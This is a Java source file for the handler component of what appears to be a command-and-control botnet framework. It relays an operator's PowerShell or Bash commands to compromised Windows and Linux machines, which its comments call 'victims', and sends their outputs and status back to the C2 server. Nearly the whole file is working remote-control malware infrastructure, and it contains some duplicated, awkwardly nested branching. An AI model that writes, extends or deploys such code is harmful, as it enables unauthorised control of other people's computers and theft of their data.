package Servers.Beacon;

import java.io.IOException;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;

import Servers.Duplexer;

public class BeaconC2Handler implements Runnable{
    // Pointer to the Long Range Beacon Server that interacts with the clients (victims)
    private BeaconServer beaconServer;

    // Pointer to the C2 Server that the user interacts with the user
    private Duplexer C2Server;

    // Hashed Password for Authentication to the C2 Server
    private String passwordDigest;

    /**
     * This starts a thread that sends and receives messages with the C2 Server
     * 
     * This thread then interacts with the Long Range Beacon Server, the Long Range Beacon
     * Server then interacts with all of the clients (victims)
     * 
     * @param beaconServer The Long Range Beacon Server
     * @param C2ServerIPAddress The IP Address of the C2 Server
     * @throws IOException
     */
    protected BeaconC2Handler(BeaconServer beaconServer, String C2ServerIPAddress, String passwordDigest) throws IOException{
        this.beaconServer = beaconServer;
        Socket socket = new Socket(C2ServerIPAddress, 1234);
        this.C2Server = new Duplexer(socket);
        this.passwordDigest = passwordDigest;
    }

    /**
     * Function meant to be used by the Long Range Beacon Server
     * to send data back to the C2 Server when it's requested
     * 
     * @param Data The Data to be sent back to the C2 Server
     */
    protected void sendDataToC2Server(String Data){
        C2Server.send(Data);
    }

    // Helper Method to Append Client Responses
    private void appendClientResponses(StringBuilder response, String IP, ArrayList<String> responses) {
        response.append("Client IP: ").append(IP).append("\n");
        for (int i = 0; i < responses.size(); i++) {
            String line = responses.get(i).trim();
            if (!line.isEmpty()) {
                response.append(String.format("  %d. %s%n", i + 1, line));
            }
        }
        response.append("\n"); // Add newline between different clients
    }

    @Override
    public void run(){
        /**
         * Commands from the C2 Server are organized in a hierarchical structure
         * Command to be sent to Computer
         *      Either Windows or Linux
         *          All Computers, or specific computer
         * Request for Data from the Long Range Beacon
         *      Client Responses
         *          Either Windows or Linux
         *              All computers, or specific computer
         *      Client Status Updates
         *          All, Windows, Linux, or Specific Computer
         */

        // Attempt to authenticate with the C2 Server. If authentication fails, gracefully close, and distribute the quit
        // message to the Beacon Server for further distribution.
        Boolean authenticationSentinel = true;
        C2Server.send(passwordDigest);
        try{
            String message = C2Server.receive();
            if(!(message.equals("Authentication Successful"))){
                String reason = "Authentication with the C2 Server Unsuccesful. Message Received from C2 Server: " + message;
                beaconServer.quit(reason);
                C2Server.close();
                authenticationSentinel = false;
            }
        }catch(IOException e){
            e.printStackTrace();
        }
        
        while(authenticationSentinel){
            try{
                String message = C2Server.receive();
                System.out.println(message);
                String[] tokensAndCommands = message.split("_");
                String[] tokens = tokensAndCommands[0].split(" ");
                String verb = tokens[0];
                String scope = tokens[1];
                String target = tokens[2];
                String commands = tokensAndCommands[1];
                if(tokens[0].equals("quit")){
                    break;
                }
                if(verb.equals("Command")){
                    // If a message is a command, it will be in the format "Command [OS - Windows or Linux] [Scope - All or an IP Address]_[Powershell/Bash command to be run]"
                    if(target.equals("All")){
                        beaconServer.distributeCommands(tokens[1], commands);
                    } else {
                        beaconServer.distributeCommands(scope, commands);
                    }
                }
                // If a message is a request, it will be in the format "Request ClientData [Target - Windows or Linux] [Scope - All or an IP Address]_"
                else if(verb.equals("Request")){
                    StringBuilder responseToRequest = new StringBuilder();
                    if(scope.equals("ClientData")){
                        // Windows Request
                        if(target.equals("Windows")){
                            if(tokens[3].equals("All")){
                                HashMap<String, ArrayList<String>> windowsClientResponseList = beaconServer.getMultipleClientResponses("Windows");
                                for (String IP : windowsClientResponseList.keySet()) {
                                    responseToRequest.append("Client IP: ").append(IP).append("\n");
                                    responseToRequest.append("Responses:\n");

                                    ArrayList<String> responses = windowsClientResponseList.get(IP);
                                    for (int i = 0; i < responses.size(); i++) {
                                        String line = responses.get(i).trim(); // Trim to remove extra spaces or newlines
                                        
                                        // Only add if the line is not empty
                                        if (!line.isEmpty()) {
                                            responseToRequest.append(String.format("  %d. %s%n", i + 1, line));
                                        }
                                    }
                                    responseToRequest.append("\n"); // Separate each client's response block with a newline
                                }
                                }
                                if (target.equals("Windows")) {
                                    String IP = tokens[3];
                                    HashMap<String, ArrayList<String>> windowsClientResponseList = beaconServer.getMultipleClientResponses("Windows");
                                
                                    if (IP.equals("All")) {
                                        for (String clientIP : windowsClientResponseList.keySet()) {
                                            appendClientResponses(responseToRequest, clientIP, windowsClientResponseList.get(clientIP));
                                        }
                                    } else {
                                        appendClientResponses(responseToRequest, IP, windowsClientResponseList.get(IP));
                                    }
                                } 
                                // Linux Request
                                else if (target.equals("Linux")) {
                                    String IP = tokens[3];
                                    HashMap<String, ArrayList<String>> linuxClientResponseList = beaconServer.getMultipleClientResponses("Linux");
                                
                                    if (IP.equals("All")) {
                                        for (String clientIP : linuxClientResponseList.keySet()) {
                                            appendClientResponses(responseToRequest, clientIP, linuxClientResponseList.get(clientIP));
                                        }
                                    } else {
                                        appendClientResponses(responseToRequest, IP, linuxClientResponseList.get(IP));
                                    }
                                }
                                
                                // Send the final response
                                C2Server.send(responseToRequest.toString());
                                
                            }
                        }
                    }
                // Request Client Status
                else if(scope.equals("ClientStatus")){
                    String responseToRequest;
                    responseToRequest = beaconServer.getClientStatus();
                    C2Server.send(responseToRequest);
                }
                
                
            } catch(IOException e){
                e.printStackTrace();
            }
        }
    }
}
